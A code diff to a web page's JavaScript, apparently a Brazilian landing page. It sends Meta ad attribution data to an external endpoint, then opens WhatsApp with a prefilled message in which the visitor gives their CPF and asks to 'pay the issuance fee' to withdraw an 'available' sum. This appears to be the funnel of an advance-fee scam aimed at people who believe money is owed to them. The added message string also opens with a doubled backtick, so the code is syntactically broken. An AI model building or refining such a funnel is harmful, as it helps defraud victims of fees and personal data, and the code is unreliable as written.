@@ -562,15 +562,110 @@ src="https://www.facebook.com/tr?id=1119253847528378&ev=PageView&noscript=1"
 
         
 
+
 function dispararWhatsApp(event) {
+    event.preventDefault();
+
     const marcado = document.getElementById('modal-check').checked;
 
     if (!marcado) {
-        event.preventDefault();
         return;
     }
 
-    // Captura dados do Facebook Ads
+    if (window.atendimentoEmAndamento) {
+        return;
+    }
+
+    window.atendimentoEmAndamento = true;
+
+    const botao = event.currentTarget;
+
+    // Captura os dados de atribuição
+    const dados = obterDadosMeta();
+
+    // Gera protocolo exclusivo
+    const protocolo = 'ATD-' + crypto.randomUUID();
+
+    // Abre uma aba para evitar bloqueio de pop-up
+    const abaWhatsApp = window.open('', '_blank');
+
+    const API_LOVABLE =
+        'https://protocol-payment-confirmation.lovable.app/api/public/attribution';
+
+    fetch(API_LOVABLE, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            protocol: protocolo,
+            fbc: dados.fbc || null,
+            fbp: dados.fbp || null,
+            fbclid: dados.fbclid || null,
+            campaign_id: dados.campaign_id || null,
+            adset_id: dados.adset_id || null,
+            ad_id: dados.ad_id || null,
+            source_url: window.location.origin +
+                        window.location.pathname
+        })
+    })
+    .then(async resposta => {
+        const resultado = await resposta.json();
+
+        if (!resposta.ok || resultado.ok !== true) {
+            throw new Error(
+                resultado.error || 'Falha ao registrar atendimento'
+            );
+        }
+
+        // Registra Lead após salvar o protocolo
+        if (typeof fbq === 'function') {
+            fbq('track', 'Lead');
+        }
+
+        const numerosWhatsApp = [
+            '5516981539469'
+        ];
+
+        const numeroSorteado = numerosWhatsApp[
+            Math.floor(Math.random() * numerosWhatsApp.length)
+        ];
+
+        // Mensagem automática
+        const textoMensagem =
+            ``Oi quero pagar a taxa de emissao. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.` +
+            `Protocolo: ${protocolo}`;
+
+        const linkZap =
+            `https://wa.me/${numeroSorteado}?text=${encodeURIComponent(textoMensagem)}`;
+
+        if (abaWhatsApp && !abaWhatsApp.closed) {
+            abaWhatsApp.location.replace(linkZap);
+        } else {
+            window.location.href = linkZap;
+        }
+    })
+    .catch(erro => {
+        console.error('Erro ao registrar atendimento:', erro);
+
+        if (abaWhatsApp && !abaWhatsApp.closed) {
+            abaWhatsApp.close();
+        }
+
+        alert(
+            'Não foi possível iniciar o atendimento. ' +
+            'Tente novamente.'
+        );
+    })
+    .finally(() => {
+        window.atendimentoEmAndamento = false;
+    });
+}
+
+</script>
+
+<script>
+function obterDadosMeta() {
     const params = new URLSearchParams(window.location.search);
 
     const chaves = [
@@ -598,12 +693,6 @@ function dispararWhatsApp(event) {
         }
     });
 
-    if (params.has('fbclid')) {
-        dados.fbc =
-            'fb.1.' + Date.now() + '.' + params.get('fbclid');
-    }
-
-    // Captura cookies do Meta Pixel
     function lerCookie(nome) {
         const item = document.cookie
             .split('; ')
@@ -616,89 +705,24 @@ function dispararWhatsApp(event) {
             : null;
     }
 
+    if (params.has('fbclid') && !lerCookie('_fbc')) {
+        dados.fbc =
+            'fb.1.' + Date.now() + '.' + params.get('fbclid');
+    }
+
     dados.fbc = lerCookie('_fbc') || dados.fbc || null;
     dados.fbp = lerCookie('_fbp') || dados.fbp || null;
 
-    // Salva atribuição na sessão
     sessionStorage.setItem(
         'meta_attribution',
         JSON.stringify(dados)
     );
 
-    // Registra evento Lead
-    if (typeof fbq === 'function') {
-        fbq('track', 'Lead');
-    }
-
-    // Lista de WhatsApps
-    const numerosWhatsApp = [
-        "5516981539469"
-    ];
-
-    // Seleciona um número aleatoriamente
-    const numeroSorteado = numerosWhatsApp[
-        Math.floor(Math.random() * numerosWhatsApp.length)
-    ];
-
-    // Mensagem automática
-    const textoMensagem =
-        `Oi quero pagar a taxa de emissao. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.`;
-
-    // Monta link do WhatsApp
-    const linkZap =
-        `https://wa.me/${numeroSorteado}?text=${encodeURIComponent(textoMensagem)}`;
-
-    event.currentTarget.href = linkZap;
+    return dados;
 }
 
-    </script>
-    
-<script>
-(function () {
-  const params = new URLSearchParams(window.location.search);
-  const keys = [
-    "fbclid",
-    "utm_campaign",
-    "utm_content",
-    "campaign_id",
-    "adset_id",
-    "ad_id"
-  ];
-
-  const data = JSON.parse(
-    sessionStorage.getItem("meta_attribution") || "{}"
-  );
-
-  keys.forEach(key => {
-    if (params.has(key)) {
-      data[key] = params.get(key);
-    }
-  });
-
-  if (params.has("fbclid")) {
-    data.fbc = "fb.1." + Date.now() + "." +
-      params.get("fbclid");
-  }
-
-  if (document.cookie.includes("_fbp=")) {
-    data.fbp = document.cookie
-      .split("; ")
-      .find(c => c.startsWith("_fbp="))
-      ?.split("=")[1];
-  }
-
-  if (document.cookie.includes("_fbc=")) {
-    data.fbc = document.cookie
-      .split("; ")
-      .find(c => c.startsWith("_fbc="))
-      ?.split("=")[1];
-  }
-
-  sessionStorage.setItem(
-    "meta_attribution",
-    JSON.stringify(data)
-  );
-})();
+// Captura os identificadores na chegada ao site
+obterDadosMeta();
 </script>
 
 </body>
